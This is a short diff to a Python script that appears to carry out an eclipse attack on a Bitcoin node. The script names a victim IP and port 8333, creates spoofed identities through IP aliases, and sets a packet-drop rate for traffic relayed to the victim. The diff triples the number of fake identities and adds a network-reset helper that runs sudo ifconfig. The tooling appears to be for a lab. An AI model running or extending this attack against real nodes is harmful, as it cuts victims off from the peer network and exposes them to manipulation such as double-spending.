@@ -18,7 +18,7 @@ import time
 # Percentage (0 to 1) of packets to drop, else: relayed to victim
 eclipse_packet_drop_rate = 0
 
-num_identities = 1
+num_identities = 3
 
 victim_ip = '10.0.2.4'
 victim_port = 8333
@@ -55,12 +55,17 @@ def random_ip():
 		if ip not in [x[0] for x in identity_address]: break
 	return ip
 
+# If all else fails, we can use this to recover the network
+def reset_network():
+	print('Resetting network...')
+	terminal(f'sudo ifconfig {network_interface} {attacker_ip} down')
+	terminal(f'sudo ifconfig {network_interface} {attacker_ip} up')
+
 # Create an alias for a specified identity
 def ip_alias(ip_address):
 	global alias_num
 	print(f'Setting up IP alias {ip_address} on {network_interface}')
 	interface = f'{network_interface}:{alias_num}'
-	terminal(f'sudo ifconfig {interface} {ip_address} down')
 	terminal(f'sudo ifconfig {interface} {ip_address} netmask 255.255.255.0 broadcast {broadcast_address} up')
 	alias_num += 1
 	return interface
